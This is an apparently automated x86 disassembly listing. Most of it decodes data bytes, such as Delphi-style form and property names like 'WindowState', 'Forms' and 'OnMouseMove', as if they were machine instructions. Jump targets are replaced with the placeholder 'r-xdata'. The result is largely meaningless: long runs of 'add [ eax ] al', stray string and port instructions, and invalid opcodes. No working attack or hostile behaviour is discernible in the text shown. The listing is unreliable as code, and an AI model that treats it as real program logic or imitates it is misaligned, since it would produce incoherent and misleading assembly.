push edi
imul ebp [ esi + 0x64 ] 0x620d776f
jae r-xdata
jne r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
bound eax [ ecx ]
add bh bh
xor [ 0x10045 ] dl
add [ eax ] al
add [ eax ] al
add [ eax + 0xf ] al
adc [ eax ] eax
or al [ edx + 0x65 ]
jbe r-xdata
add [ eax ] al
str [ edx ]
inc ecx
jne r-xdata
insb
insb
inc edx
outsd
js r-xdata
add [ eax ] dh
test [ ebp ] r-xdata
and al 0x2
add [ eax ] al
test al 0xf3
inc ebp
add [ edi + eax ] dh
imul edi [ edx + 0x65 ] 0x6c6f6f54
push edi
imul ebp [ esi + 0x5 ] 0x6d726f46
add bh bh
aam 0x32
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax + eax ] dl
insb
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
sub al 0x46
test [ ebp ] 0x4
cmc
inc ebp
add [ eax + eax + 0x5 ] al
inc esi
outsd
jb r-xdata
hlt
jb r-xdata
inc ebp
jae r-xdata
or [ edx + 0x65 ] eax
jbe r-xdata
pop esp
inc esp
add [ ebp + 0x1 ] ah
add bh bh
pushad
adc eax 0x10045
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x0
pop ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
push 0x80ff0001
adc eax 0x10045
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx ] dl
add [ edx ] cl
inc edx
jbe r-xdata
pop esp
inc esp
add [ ebx + 0x1 ] ah
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or [ ecx + 0x75 ] al
je r-xdata
jae r-xdata
add bh bh
jpe r-xdata
je r-xdata
add [ eax + 0x430b0018 ] al
outsd
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
fsub [ eax + 0x44 ]
add [ eax - 0x80000000 ] al
push ss
add [ eax ] cl
inc edx
adc eax 0x65420a00
jbe r-xdata
add [ eax ] al
insb
dec ecx
outsb
outsb
jb r-xdata
add [ eax ] al
push cs
add [ edi ] al
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax + 0x46 ] dl
inc esp
add [ ebx ] bl
add bh bh
int3
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
outsb
jae r-xdata
insb
and [ gs : esi + 0x44 ] cl
add [ eax + eax ] dh
dec [ esp + eax * 8 + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] al
or eax [ ebx + 0x6f ]
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx ] dl
add [ edx ] cl
inc edx
jbe r-xdata
inc esp
add [ ecx + eax ] ah
pop esp
add bh bh
in al dx
adc al 0x45
add [ ecx ] al
add [ eax ] dl
inc eax
[ eax - 0x5f ]
inc esp
add [ ecx + 0x44 ] dh
jae r-xdata
add [ eax ] al
add [ ebx ] bl
add [ eax ] cl
inc esp
jb r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax + 0x7cff0001 ] ch
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] eax
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
cmp [ gs : esi + 0x44 ] al
add [ edx ] bh
imul eax [ ecx + ebp * 2 + 0x4d ] 0xe865646f
cmc
inc ebp
add [ eax ] ah
add al [ eax ]
call esp
xor al [ esi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax + 0x42080016 ] al
insb
dec edi
adc [ eax ] al
movsd [ edi ] [ esi ]
add [ eax ] eax
[ eax ]
or [ ebp ] eax
cmp al 0x9
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001f ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001e ] al
outsd
insb
outsd
add bh bh
pop eax
mov eax [ 0xffffffffa1740044 ]
inc esp
jb r-xdata
jb r-xdata
sbb [ esi ] 0x0
add eax 0x6f6c6f43
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
xor eax [ eax + edi + 0x1b ]
inc edx
add [ eax ] ch
add bh bh
lodsb [ esi ]
mov al [ 0xffffffffa0bc0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040020 ] al
outsd
outsb
arpl [ ebx + 0x53 ] bp
imul esi [ ebp + 0x38 ] 0x7a004446
add [ eax ] al
dec esp
inc esp
add [ ebx - 0x64010000 ] bl
je r-xdata
jne r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
inc esi
add [ fs : eax ] dl
inc eax
add [ edx ] bl
add bh bh
jl r-xdata
fcomp [ esi - 0x3fcbffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8656c62
push esp
inc esp
add al al
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002c ] al
outsb
inc ebx
jo r-xdata
adc [ eax ] al
0x2cff0000 0x44a1
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
sub [ edi ] 0x0
push cs
jpe r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
dec [ edx + ecx ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub al [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
outsb
je r-xdata
add [ ecx ] 0x0
outsb
je r-xdata
add [ eax ] al
js r-xdata
add [ eax ] al
in al 0x7c
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
adc [ eax ] al
push edi
add [ eax ] al
adc [ eax ] al
cdq
add [ eax ] al
dec [ eax ]
mov eax [ 0xffffffffa0d00044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080028 ] al
push 0x6948776f
outsb
je r-xdata
or [ ebp ] eax
hlt
push 0x6948776f
outsb
je r-xdata
add [ edx ] cl
push eax
popad
outsd
insb
outsd
jb r-xdata
or [ edi + 0x6e ] ecx
jb r-xdata
enter 0x4450 0x0
call 0xffffffffe944fce1
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0033 ] al
outsb
push eax
outsd
jo r-xdata
or [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
sub [ eax ] eax
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
dec ebp
inc esp
add [ ecx + ecx + 0x45 ] dh
add [ eax ] al
add [ es : esi ] cl
jo r-xdata
xchg ebp eax
inc ebp
add [ eax + eax ] bh
push [ eax - 0x61 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090027 ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
adc [ eax ] al
test eax 0x48ff0001
or [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
and al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
inc edi
je r-xdata
in al 0x7c
inc ecx
add [ eax ] 0x0
add [ eax + 0x4f0a0031 ] al
outsb
inc esp
outsd
push eax
inc esp
add al ch
add [ eax ] 0x0
add [ eax + 0x4f090036 ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
add [ eax ] al
jo r-xdata
popad
outsb
push edx
jae r-xdata
jb r-xdata
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
imul ebp [ esi + 0x74 ] r-xdata
je r-xdata
outsd
add [ eax ] al
add [ eax - 0x80000000 ] al
daa
add [ ecx ] cl
push eax
outsb
je r-xdata
fmul [ esi + 0x44 ]
add al ah
add [ eax ] al
jmp eax
imul esi [ ebp + 0x49 ] 0xdc6f666e
dec esi
inc esp
outsb
dec ebp
outsd
jne r-xdata
dec edi
jb r-xdata
jb r-xdata
jo r-xdata
jl r-xdata
jo r-xdata
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ esi ] cl
jl r-xdata
adc [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add ah dh
inc ebp
push eax
popad
jb r-xdata
push cs
je r-xdata
insb
nop
inc esp
outsd
ja r-xdata
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jl r-xdata
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060038 ] al
outsb
inc ebp
js r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x70 ] bp
push ecx
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ecx
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090035 ] al
inc esp
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
or cl [ edi + 0x6e ]
add [ eax + 0x4f0a0032 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
push edx
inc esp
add [ eax - 0x4700ffff ] bh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push ebx
inc esp
add al dl
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0039 ] al
outsb
add al al
add [ eax ] eax
outsb
push eax
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0034 ] al
outsb
inc esp
jb r-xdata
arpl [ ebx + 0x44 ] bp
jb r-xdata
add [ eax ] ch
add [ eax ] eax
[ eax ]
jb r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
in al 0xa0
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax 0x61500a00
push ebx
je r-xdata
push edi
push esp
dec edi
inc esp
add al bl
add [ eax ] al
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003a ] al
dec ecx
outsb
outsw
fmul [ esi + 0x44 ]
add al cl
add [ eax ] eax
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
je r-xdata
add [ eax + 0x4f070037 ] al
add [ eax ] al
dec edi
jbe r-xdata
outsd
jb r-xdata
inc esp
nop
push ebp
inc esp
add [ eax + 0x1 ] cl
add bh bh
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e003f ] al
push 0x446c6565
outsd
ja r-xdata
dec ebp
outsd
jbe r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09003c ] al
outsb
dec ebp
outsd
jne r-xdata
outsb
inc ebp
outsb
je r-xdata
das
mov cl 0xec
add eax 0x6d726f46
jae r-xdata
inc ebp
jb r-xdata
inc esp
jb r-xdata
push edi
push 0x556c6565
jo r-xdata
dec ebp
outsd
jne r-xdata
adc [ edi + 0x6e ] cl
outsd
jne r-xdata
push ebp
jo r-xdata
insb
inc esi
invd
dec ecx
add [ edi ] cl
or [ ecx + 0x4f ] cl
add bh bh
dec [ ebx + 0x45ff8cc0 ]
insd
mov ah 0x11
inc eax
add [ ecx ] al
shl ecx 0x2
int 0xda
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4605da82
outsd
jb r-xdata
ficom [ edx - 0x30 ]
adc [ esi - 0x50dfff5a ] ebx
dec edi
outsd
imul edi [ ebp + ecx * 4 - 0x5afeffbf ] 0x1d
inc ebx
push ds
0xa34de72b 0xcc30
les edx [ bp + si + 0x44 ]
add al dh
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080043 ] al
outsb
dec ebp
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aas
add [ esi ] cl
dec edi
jl r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c003d ] al
outsb
dec ebp
outsd
jne r-xdata
push ebp
inc esp
add [ eax ] bh
add [ eax ] eax
outsd
jb r-xdata
inc eax
add [ eax + eax ] cl
add [ ebx ] al
add [ eax ] al
add [ eax ] cl
add [ esi ] al
or al 0x62
imul edx [ ebx + 0x79 ] 0x6d657473
jae r-xdata
je r-xdata
add al bh
add [ eax ] al
add [ eax ] cl
dec edi
outsb
push edx
jae r-xdata
push ebp
inc esp
add [ eax + 0x1 ] al
add bh bh
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f10003e ] al
outsb
push edi
push 0x906c6565
push eax
outsd
jb r-xdata
or ah [ edx + 0x69 ]
dec ebp
bound ebp [ ecx + 0x4d ]
imul ebp [ esi + 0x69 ] 0x657a696d
dec [ ebp - r-xdata ]
inc ebp
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
jb r-xdata
add bh bh
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
rcr [ eax - 0x1 ] 0x45
add [ edi ] cl
or eax 0x73654449
imul esp [ edi + 0x6e ] 0x6f487265
dec edi
outsd
arpl [ ebx + 0x28 ] bp
push ecx
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0042 ] al
outsb
push ebx
je r-xdata
jpe r-xdata
jo r-xdata
je r-xdata
inc edx
arpl [ edi + 0x6e ] bp
add [ eax ] eax
add [ eax ] al
dec edi
insd
imul edi [ edx + 0x65 ] 0x48696206
outsb
jne r-xdata
push ebx
je r-xdata
add [ eax ] cl
xor [ ebx + 0x44 ] dl
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0041 ] al
outsb
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsb
je r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ eax ] dh
inc esi
add [ edx ] cl
jo r-xdata
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ebx
outsb
je r-xdata
jb r-xdata
push cs
jo r-xdata
mov eax eax
pop esp
add [ esi ] al
inc esi
outsd
jb r-xdata
popad
js r-xdata
bound ebp [ ecx + 0x4d ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0x80045ff ] bh
jae r-xdata
push es
add eax 0x6d726f46
jae r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
inc esp
jae r-xdata
jo r-xdata
jb r-xdata
outsb
insb
jns r-xdata
arpl [ edi + 0x6e ] bp
jae r-xdata
outsd
add [ eax ] al
add eax [ eax ]
add [ eax ] al
or al 0x1
inc esp
popa
jne r-xdata
insb
jns r-xdata
jae r-xdata
bound ebp [ ecx + 0x53 ]
jns r-xdata
outsd
jb r-xdata
add [ esi ] eax
push es
inc eax
add ah dh
arpl [ ecx + 0x4e ] sp
outsd
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
inc esi
add [ esi ] al
add [ esi ] eax
add ecx [ ebx ]
add eax 0x6d726f46
jo r-xdata
jo r-xdata
arpl [ ecx + 0x6c ] sp
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x1 ] ah
inc esi
add [ esi ] al
inc ebx
outsb
je r-xdata
inc esi
outsb
or [ fs : eax + 0x6f ] esi
inc esp
popa
jne r-xdata
or ah [ ebp + ebp * 2 + 0x4d ]
insd
push eax
adc [ eax + 0x6f ] dh
jo r-xdata
add [ esi ] al
nop
je r-xdata
or [ eax ] al
inc esi
add [ eax + r-xdata ] dl
je r-xdata
je r-xdata
inc esi
add [ ecx ] cl
insd
inc esp
jae r-xdata
add [ eax ] al
add [ ecx + eax ] cl
je r-xdata
pshufw mm5 [ edi + 0x44 ] 0x65
jae r-xdata
jo r-xdata
inc esp
dec ecx
inc ebx
push 0x9646c69
jae r-xdata
push es
rcr [ eax + eax + 0x46 ] 0x0
insb
je r-xdata
insb
jo r-xdata
push es
popad
insb
or ah [ esi + 0x73 ]
dec ebp
hlt
dec esi
outsd
outsb
push cs
inc ebx
insb
outsd
inc ebp
jbe r-xdata
push es
arpl [ ecx + 0x46 ] sp
jb r-xdata
outsb
je r-xdata
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
add [ esi ] eax
push esp
push eax
dec edi
ja r-xdata
jb r-xdata
jne r-xdata
adc [ ecx ] al
inc esi
add [ ebx ] al
andps xmm0 [ ebp + 0x66 ]
je r-xdata
nop
insd
popad
jb r-xdata
popad
dec ebp
inc esp
jae r-xdata
jae r-xdata
inc esi
add [ ebx ] al
or [ eax + edx * 2 + 0x6f ] edx
inc esi
outsd
jb r-xdata
jae r-xdata
add ecx [ edi ]
push esp
imul edi [ edx + 0x65 ] 0x796c6e4f
je r-xdata
insd
imul edi [ edx + 0x65 ] 0x4d69620a
inc esp
dec ecx
inc esi
outsd
jb r-xdata
adc [ eax + 0x6f ] esi
jo r-xdata
dec ebp
insd
inc ebx
insb
outsd
push eax
jb r-xdata
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x10000040 ] dl
inc eax
add [ eax + r-xdata ] dl
or [ esi ] cl
push esp
push ebx
push 0x4374726f
jne r-xdata
jae r-xdata
outsb
je r-xdata
push ecx
jne r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
add [ eax ] al
add [ eax + 0x6004601 ] ch
jo r-xdata
push cs
je r-xdata
jb r-xdata
jb r-xdata
inc esi
outsd
jb r-xdata
outsd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
test al 0x1
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ esi ] eax
jb r-xdata
or [ ebp + ebp * 2 + 0x50 ] esp
lodsb [ esi ]
add [ esi ] eax
add ecx [ esp + edx * 2 ]
inc ebx
insb
outsd
jae r-xdata
jb r-xdata
jo r-xdata
outsd
jb r-xdata
or esp [ esi + 0x73 ]
push ebx
je r-xdata
inc esp
popa
inc esp
popa
jne r-xdata
jae r-xdata
jo r-xdata
test al 0xf3
inc ebp
add [ esp + eax * 2 ] al
popad
je r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] al
adc [ eax ] 0x40
add [ eax + edx + 0x40 ] dl
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
pop esp
add eax [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
add al 0x46
inc ebp
jbe r-xdata
add cl [ eax ]
push es
popad
outsb
add [ eax ] al
jb r-xdata
outsd
outsb
insd
outsd
add [ eax ] al
pushad
jae r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx + edx + 0x1a80040 ] dl
inc esi
add [ ebp + 0x2380040 ] cl
inc esi
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6c ] dl
outsd
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
or al 0x64
insd
add [ ebx ] al
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
or al 0x54
inc esi
add [ esi ] al
jns r-xdata
popad
je r-xdata
jb r-xdata
mov al [ 0x42840044 ]
inc esi
add ah dh
retn 0x44
add [ ebx + esi ] bl
inc esi
add [ esi + ecx ] al
inc ebp
add [ eax ] ah
adc eax [ ebp ]
insb
adc al [ ebp ]
cld
xchg edx eax
inc esp
add [ eax + 0x24004508 ] al
aas
inc esi
add [ eax + 0x44004505 ] al
xchg edx eax
inc esp
add [ eax - 0x6e ] cl
inc esp
add [ eax ] bl
inc eax
inc esi
add [ eax - 0x3e ] dh
inc esp
add [ eax - 0x3fffbb63 ] cl
xchg ebx eax
inc esp
add [ edi + ebx * 4 ] dl
inc esp
add [ edx + eax * 2 ] cl
inc esi
add al bl
inc eax
inc esi
add [ eax + 0x44 ] cl
add [ edx + eax * 2 - 0x3d0bffba ] al
inc esp
add [ esi + eax ] cl
inc ebp
add al cl
push es
inc ebp
add [ ecx + eax + 0x6ac0045 ] cl
inc ebp
add [ ecx + esi ] ah
inc esi
add [ eax ] ch
dec ecx
inc esi
add [ eax - 0x24 ] al
inc esp
add ah ch
push ebp
inc esi
add [ ecx + ebx * 2 + 0x46 ] cl
add [ eax ] cl
pop eax
inc esi
add al bl
fadd [ eax + eax - 0x24 ]
fadd [ eax + eax - 0x7c ]
pop edx
inc esi
add [ ebx + ebx * 8 ] bh
inc esp
add ah ch
pop es
inc ebp
add [ eax + 0x61 ] bh
inc esi
add al ah
sbb [ ebp ] eax
xor [ eax * 2 + 0x46768c00 ] al
add [ eax ] bl
sub eax [ esi ]
enter 0x462d 0x0
insb
inc esi
add [ eax + 0x24004637 ] ch
cmp [ esi ] al
insb
jpe r-xdata
add [ edi + eax ] dh
pop es
dec ecx
outsb
je r-xdata
inc edx
add [ eax + 0x5c004634 ] ch
inc esi
add al bh
add al [ eax ]
add [ eax + 0x340045f3 ] ch
pop es
inc esi
add dl ah
add eax 0x2f80046
add [ eax ] al
outsd
insb
popad
outsb
outsb
je r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
add ah dh
add eax 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
push esp
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x35c0040 ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4 ] dl
inc esi
jbe r-xdata
jo r-xdata
inc ebp
jbe r-xdata
outsd
outsd
insb
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
bound ebp [ ecx + 0x48 ]
outsb
push esp
outsd
jo r-xdata
outsd
jae r-xdata
push ebx
outsb
jb r-xdata
or [ esi ] al
imul ebp [ edi + 0x6e ] 0x700c6c61
outsd
push eax
jb r-xdata
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
add al ah
xor al 0x46
add [ eax + 0x75 ] dh
inc esi
add [ eax + 0x5c ] dl
inc esi
add [ edi + esi * 2 ] ah
inc esi
add [ eax ] cl
inc edx
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ecx + edx ] al
inc eax
add [ edx + eax ] bh
add [ eax ] al
push esp
inc [ ebp ]
push eax
add al [ eax ]
add [ eax + 0x640045ff ] cl
add al [ eax ]
add [ 0x14000f00 ] bh
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
inc esi
add [ eax - 0x37ffbfcc ] dh
pop edx
inc esi
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add ah al
inc esi
add al dh
adc al [ ebp ]
xor al 0x3c
inc esi
add al cl
stosd [ edi ]
inc ecx
add [ eax + edi + 0x38c00046 ] al
inc esi
add ah cl
cmp [ esi ] eax
mov al [ 0x4c00449d ]
pop es
inc edx
add [ edx + eax * 2 + 0x46 ] al
add [ esp + eax ] ch
inc edx
add ah ah
jge r-xdata
pop esp
jb r-xdata
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ edx + 0x4 ] dh
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax 0x8004602
or dl [ eax + ecx * 2 + 0x65 ]
insb
outsb
je r-xdata
adc [ eax + 0x6f ] esi
inc esi
add [ ebx ] al
or edx [ edx + eax * 2 + 0x6f ]
jb r-xdata
lea eax [ eax ]
or al 0x0
inc esi
outsd
jb r-xdata
outsb
je r-xdata
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
dec eax
popad
outsb
insb
pop es
inc edx
pop es
add [ edi ] al
inc ebx
outsd
insd
add eax [ eax ]
pop es
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add ecx [ ecx ]
push esp
add [ esi ] al
jae r-xdata
add [ esi ] eax
or [ ebx ] cl
push esp
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
pop es
inc edx
outsd
outsd
insb
popad
inc edx
outsd
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
sub_460618
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
pop es
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + eax + 0x46 ] dl
add al bh
add al [ eax ]
add [ eax ] dl
add eax [ esi ]
xor al 0x7
inc edx
add [ eax + 0x5c004634 ] ch
inc esi
add [ eax - 0x37ffbfcc ] dh
pop edx
inc esi
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add ah al
inc esi
add al dh
adc al [ ebp ]
xor al 0x3c
inc esi
add al cl
stosd [ edi ]
inc ecx
add [ eax + edi + 0x38c00046 ] al
inc esi
add ah cl
cmp [ esi ] eax
mov al [ 0x4c00449d ]
pop es
inc edx
add [ edx + eax * 2 + 0x46 ] al
add [ esp + eax ] ch
inc edx
add ah ah
jge r-xdata
